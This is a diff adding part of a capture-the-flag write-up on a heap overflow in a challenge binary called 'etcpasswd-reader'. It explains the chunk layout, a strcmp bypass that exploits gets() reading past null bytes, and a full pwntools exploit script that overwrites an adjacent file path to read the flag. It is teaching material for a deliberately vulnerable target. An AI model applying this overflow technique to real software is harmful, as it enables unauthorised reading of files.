@@ -106,3 +106,59 @@ In the dockerfile, we can find the path to the flag. Before we go into exploitat
 
 The image above shows the structure of a heap chunk when we allocate it. The payload area is the location where we can store data. Above the payload, there is some metadata about the heap chunk. For example, the size of the chunk and also some flags (AMP) needed for internal functions. We can verify this by taking a look in gdb.
 
+![image](https://github.com/user-attachments/assets/0c65f0a9-c44b-40ee-99ea-e92f6001e086)
+
+We can see both of our chunks here. 0x51 is the size of the chunk because we malloc 0x40, another 0x10 comes from the header metadata, and 0x1 is the flag PREV_IN_USE. After the size, we have the user input `aaaaaaaa`. Below this chunk, we have the chunk for the file path `/etc/passwd`. Now we know, we need to write 0x50 bytes before we start overwriting the file path. There's one more thing left to do, which is to bypass the strcmp(). We can easily do that by sending `b"P$s5w0rd_53CurE_A8S8A9DF7239FSD0\x00"` followed by more user input. This is possible because gets() only stops taking user input after it receives `\n`, not `\x00`. This will bypass strcmp() as it only compares null terminated strings.
+
+### Exploit Script
+
+```py
+#!/usr/bin/python
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./etcpasswd-reader')
+libc = exe.libc
+
+host = "etc-passwd-reader.ihack24.capturextheflag.io"
+port = 1337
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+# p = exe.process()
+p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+secret = b"P$s5w0rd_53CurE_A8S8A9DF7239FSD0\x00"
+
+payload = secret
+payload += b"A" * (80-len(secret))
+payload += b"/flag/secretflag/flag"
+
+sla(b"details: ", payload)
+
+p.interactive()
+```
+
+![image](https://github.com/user-attachments/assets/13671dba-338d-4dc9-ae19-ceba88593c7b)
